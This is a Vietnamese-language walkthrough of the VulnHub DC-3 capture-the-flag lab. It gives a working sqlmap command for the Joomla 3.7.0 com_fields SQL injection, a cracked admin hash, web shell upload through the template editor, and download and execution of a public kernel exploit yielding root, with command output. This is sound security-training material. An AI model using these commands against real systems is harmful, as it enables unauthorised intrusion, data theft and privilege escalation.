## Mở đầu
- Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên `VulnHub`. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D.
- Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm. Mở `Virtual Box` chọn card mạng bridge để cho anh em vào được rồi run nó lên thôi.
- Link con lab ấy đây, bạn nào muốn nghịch thì vào đây nha  [DC-3](https://www.vulnhub.com/entry/dc-3,312/)
## Tấn công
- Trong mô tả của lab `DC-3` cũng đã nói. Nó sẽ cho ta 1 con web và bắt chúng ta phải chiếm được quyền `root` và lấy cờ từ đó. 
- Đầu tiên phải quét được ip của con lab đang ở đâu đã. Sử dụng lệnh `nmap -sP 192.168.19.0/24` (dải địa chỉ tùy theo mạng nội bộ của bạn)
    ```bash
    Nmap scan report for 192.168.19.106
    Host is up (0.00050s latency).
    MAC Address: 08:00:27:1C:53:6A (Oracle VirtualBox virtual NIC)
    ```
- Ở đây tôi đã xác định được địa chỉ ip của con máy kia rồi, vào thôi.
![](https://images.viblo.asia/5905140f-b553-465c-921f-6ab68f2abad2.png)
- Giao diện con web cũng chẳng có gì, phát hiện được trang login, rồi trang quản trị `/administrator` nữa.
- Sử dụng `Wappalyzer` quét xem con web này đang sử dụng framework gì nào. `Joomla`, thế thì sử dụng `joomscan` trên kali thôi chứ còn gì nữa.

    ```bash
    [+] FireWall Detector
    [++] Firewall not detected

    [+] Detecting Joomla Version
    [++] Joomla 3.7.0

    [+] Core Joomla Vulnerability
    [++] Target Joomla core is not vulnerable

    [+] Checking Directory Listing
    [++] directory has directory listing : 
    http://192.168.19.106/administrator/components
    http://192.168.19.106/administrator/modules
    http://192.168.19.106/administrator/templates
    http://192.168.19.106/images/banners

    [+] Checking apache info/status files
    [++] Readable info/status files are not found

    [+] admin finder
    [++] Admin page : http://192.168.19.106/administrator/

    [+] Checking robots.txt existing
    [++] robots.txt is not found

    [+] Finding common backup files name
    [++] Backup files are not found

    [+] Finding common log files name
    [++] error log is not found

    [+] Checking sensitive config.php.x file
    [++] Readable config files are not found

    Your Report : reports/192.168.19.106/
    ```

 - Trang này sử dụng `Joomla 3.7.0`. Thử lục các `CVE` xem có cái nào nói về Joomla 3.7.0 k.

 ![](https://images.viblo.asia/6121b679-d812-4b8d-aa3d-83d481561b2e.png)

- Vãi nhái, hẳn SQL Injection luôn ạ, vào đọc thì thấy luôn `Using Sqlmap` luôn. Dump db ra thôi 
    
    ```bash
    sqlmap -u "http://192.168.19.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
    ```

- Lấy được tên db rồi lấy tên bảng, dump thẳng vào table `#__users` ta thấy được

    | id        | name           | email  |username|password|
    | ------------- |:-------------:| -----:|-----:|-----:|
    | 629      | admin | freddy@norealaddress.net |admin|$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu|
- Chúng ta có `admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`, sử dụng `hashcat` hoặc `john` để giải ra được mật khẩu là `snoopy`.
- Sử dụng mật khẩu để đăng nhập vào trang admin thôi :D
- Vào được trang rồi ta nghĩ đến gì, upload file shell =)). Đi tìm chỗ nào upload được file. Thôi lên google hỏi cho nhanh. Google bảo là vào template để upload file nhé :D.
- Ở đây chúng ta sửa được nhiều thứ lắm, các bạn có thể vào chọc ngoáy nhé, mình upload shell lên error.php cho nhanh :D

![](https://images.viblo.asia/0c4c495e-1272-469e-b85b-a8214dd46237.png)

- Xịn xò rồi, bắt tay vào chiếm quyền root thôi
- À thực ra ban đầu mình cũng chẳng biết nên bắt đầu từ đâu, thôi cứ thử bừa. lên google đọc mấy cái CVE từ tìm chương trình nào đang chạy dưới quyền root có lỗ hổng rồi sử dụng lỗ hổng đó để chiếm root, ... các thứ các thứ. Mình thử xem `uname -a` xem có gì k. `Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux`. Máy chủ sử dụng kernel 4.4.0. Search CVE tiếp xem có lỗi gì đến con Kernel này k. 
- Sử dụng `searchsploit kernel 4.4` ra kết quả `Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PR | exploits/linux/local/39772.txt`. Ta có thể sử dụng thằng này để chiếm quyền root.
- cd đến `/var/tmp` rồi `wget  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip`

![](https://images.viblo.asia/abfc7be6-9f01-481a-9abb-eedbfdd7f591.png)

- Giải nén các thứ các thứ

![](https://images.viblo.asia/4b93fcd6-3059-4678-b628-a543626cd6e0.png)

![](https://images.viblo.asia/3c25116b-d5fd-45d7-8b69-c14457c3cedb.png)

- run `compile.sh` lên rồi chạy file `./doubleput` 

    ```bash
    p0wny@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
    starting writev
    woohoo, got pointer reuse
    writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
    suid file detected, launching rootshell...
    we have root privs now...
    root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# whoami;id
    root
    uid=0(root) gid=0(root) groups=0(root),33(www-data)
    ```

- Ngon, có quyền root rồi, vào thư mục `/root` lấy cờ thôi
   
   ```console
    root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
    root@shell:/root# ls
    the-flag.txt
    root@shell:/root# cat the-flag.txt
    __        __   _ _   ____                   _ _ _ _
    \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
    \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
    \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
        \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)


    Congratulations are in order.  :-)

    I hope you've enjoyed this challenge as I enjoyed making it.

    If there are any ways that I can improve these little challenges,
    please let me know.

    As per usual, comments and complaints can be sent via Twitter to @DCAU7

    Have a great day!!!!
    root@shell:/root#
    ```

## Kết luận
- Dựa trên bài lab thấy được thằng Joomla cần phải kiểm tra cập nhật thường xuyên. Những ai đang sử dụng Joomla 3.7.0 cần phải được cập nhật ngay.
- Kernel Linux cũng cần phải cập nhật lên bản cao hơn. Cần chú ý đến các phiên bản cập nhật để vá lỗi cần thiết.